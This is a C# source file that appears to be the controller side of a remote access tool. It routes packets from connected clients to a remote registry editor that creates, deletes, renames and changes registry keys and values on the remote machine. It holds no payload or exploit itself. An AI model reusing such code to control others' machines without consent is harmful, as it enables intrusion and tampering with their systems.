using Microsoft.Win32;
using ProtoBuf;
using Server.Connection;
using Server.Forms;
using Server.Helper;
using Server.MessagePack;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.Serialization.Formatters.Binary;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using static Server.Helper.RegistrySeeker;

namespace Server.Handle_Packet
{
    class HandleRegManager
    {
        public void RegManager(Clients client, MsgPack unpack_msgpack)
        {
            try
            {
                switch (unpack_msgpack.ForcePathObject("Command").AsString)
                {
                    case "setClient":
                        {
                            FormRegistryEditor FM = (FormRegistryEditor)Application.OpenForms["remoteRegedit:" + unpack_msgpack.ForcePathObject("Hwid").AsString];
                            if (FM != null)
                            {
                                if (FM.Client == null)
                                {
                                    client.ID = unpack_msgpack.ForcePathObject("Hwid").AsString;
                                    FM.Client = client;
                                    FM.timer1.Enabled = true;
                                }
                            }
                            break;
                        }

                    case "CreateKey":
                        {
                            FormRegistryEditor FM = (FormRegistryEditor)Application.OpenForms["remoteRegedit:" + unpack_msgpack.ForcePathObject("Hwid").AsString];
                            if (FM != null)
                            {
                                string ParentPath = unpack_msgpack.ForcePathObject("ParentPath").AsString;
                                byte[] Matchbyte = unpack_msgpack.ForcePathObject("Match").GetAsBytes();

                                FM.CreateNewKey(ParentPath, DeSerializeMatch(Matchbyte));
                            }
                            break;
                        }

                    case "LoadKey":
                        {
                            FormRegistryEditor FM = (FormRegistryEditor)Application.OpenForms["remoteRegedit:" + unpack_msgpack.ForcePathObject("Hwid").AsString];
                            if (FM != null)
                            {
                                string rootKey = unpack_msgpack.ForcePathObject("RootKey").AsString;
                                byte[] Matchesbyte = unpack_msgpack.ForcePathObject("Matches").GetAsBytes();

                                FM.AddKeys(rootKey, DeSerializeMatches(Matchesbyte));
                            }
                            break;
                        }

                    case "DeleteKey":
                        {
                            FormRegistryEditor FM = (FormRegistryEditor)Application.OpenForms["remoteRegedit:" + unpack_msgpack.ForcePathObject("Hwid").AsString];
                            if (FM != null)
                            {
                                string rootKey = unpack_msgpack.ForcePathObject("ParentPath").AsString;
                                string subkey = unpack_msgpack.ForcePathObject("KeyName").AsString;

                                FM.DeleteKey(rootKey, subkey);
                            }
                            break;
                        }

                    case "RenameKey":
                        {
                            FormRegistryEditor FM = (FormRegistryEditor)Application.OpenForms["remoteRegedit:" + unpack_msgpack.ForcePathObject("Hwid").AsString];
                            if (FM != null)
                            {
                                string rootKey = unpack_msgpack.ForcePathObject("rootKey").AsString;
                                string oldName = unpack_msgpack.ForcePathObject("oldName").AsString;
                                string newName = unpack_msgpack.ForcePathObject("newName").AsString;

                                FM.RenameKey(rootKey, oldName, newName);
                            }
                            break;
                        }

                    case "CreateValue":
                        {
                            FormRegistryEditor FM = (FormRegistryEditor)Application.OpenForms["remoteRegedit:" + unpack_msgpack.ForcePathObject("Hwid").AsString];
                            if (FM != null)
                            {
                                string keyPath = unpack_msgpack.ForcePathObject("keyPath").AsString;
                                string Kindstring = unpack_msgpack.ForcePathObject("Kindstring").AsString;
                                string newKeyName = unpack_msgpack.ForcePathObject("newKeyName").AsString;
                                RegistryValueKind Kind = RegistryValueKind.None;
                                switch (Kindstring)
                                {
                                    case "-1":
                                        {
                                            Kind = RegistryValueKind.None;
                                            break;
                                        }
                                    case "0":
                                        {
                                            Kind = RegistryValueKind.Unknown;
                                            break;
                                        }
                                    case "1":
                                        {
                                            Kind = RegistryValueKind.String;
                                            break;
                                        }
                                    case "2":
                                        {
                                            Kind = RegistryValueKind.ExpandString;
                                            break;
                                        }
                                    case "3":
                                        {
                                            Kind = RegistryValueKind.Binary;
                                            break;
                                        }
                                    case "4":
                                        {
                                            Kind = RegistryValueKind.DWord;
                                            break;
                                        }
                                    case "7":
                                        {
                                            Kind = RegistryValueKind.MultiString;
                                            break;
                                        }
                                    case "11":
                                        {
                                            Kind = RegistryValueKind.QWord;
                                            break;
                                        }
                                }
                                RegValueData regValueData = new RegValueData();
                                regValueData.Name = newKeyName;
                                regValueData.Kind = Kind;
                                regValueData.Data = new byte[] { };

                                FM.CreateValue(keyPath, regValueData);
                            }
                            break;
                        }

                    case "DeleteValue":
                        {
                            FormRegistryEditor FM = (FormRegistryEditor)Application.OpenForms["remoteRegedit:" + unpack_msgpack.ForcePathObject("Hwid").AsString];
                            if (FM != null)
                            {
                                string keyPath = unpack_msgpack.ForcePathObject("keyPath").AsString;
                                string ValueName = unpack_msgpack.ForcePathObject("ValueName").AsString;

                                FM.DeleteValue(keyPath, ValueName);
                            }
                            break;
                        }

                    case "RenameValue":
                        {
                            FormRegistryEditor FM = (FormRegistryEditor)Application.OpenForms["remoteRegedit:" + unpack_msgpack.ForcePathObject("Hwid").AsString];
                            if (FM != null)
                            {
                                string keyPath = unpack_msgpack.ForcePathObject("keyPath").AsString;
                                string OldValueName = unpack_msgpack.ForcePathObject("OldValueName").AsString;
                                string NewValueName = unpack_msgpack.ForcePathObject("NewValueName").AsString;

                                FM.RenameValue(keyPath, OldValueName, NewValueName);
                            }
                            break;
                        }
                    case "ChangeValue":
                        {
                            FormRegistryEditor FM = (FormRegistryEditor)Application.OpenForms["remoteRegedit:" + unpack_msgpack.ForcePathObject("Hwid").AsString];
                            if (FM != null)
                            {
                                string keyPath = unpack_msgpack.ForcePathObject("keyPath").AsString;
                                byte[] RegValueDatabyte = unpack_msgpack.ForcePathObject("Value").GetAsBytes();

                                FM.ChangeValue(keyPath, DeSerializeRegValueData(RegValueDatabyte));
                            }
                            break;
                        }
                }
            }
            catch { }
        }

        public static RegSeekerMatch[] DeSerializeMatches(byte[] bytes)
        {
            using (MemoryStream ms = new MemoryStream(bytes))
            {
                RegSeekerMatch[] Matches = Serializer.Deserialize<RegSeekerMatch[]>(ms);
                return Matches;
            }
        }
        public static RegSeekerMatch DeSerializeMatch(byte[] bytes)
        {
            using (MemoryStream ms = new MemoryStream(bytes))
            {
                RegSeekerMatch Match = Serializer.Deserialize<RegSeekerMatch>(ms);
                return Match;
            }
        }

        public static RegValueData DeSerializeRegValueData(byte[] bytes)
        {
            using (MemoryStream ms = new MemoryStream(bytes))
            {
                RegValueData Value = Serializer.Deserialize<RegValueData>(ms);
                return Value;
            }
        }
    }
}
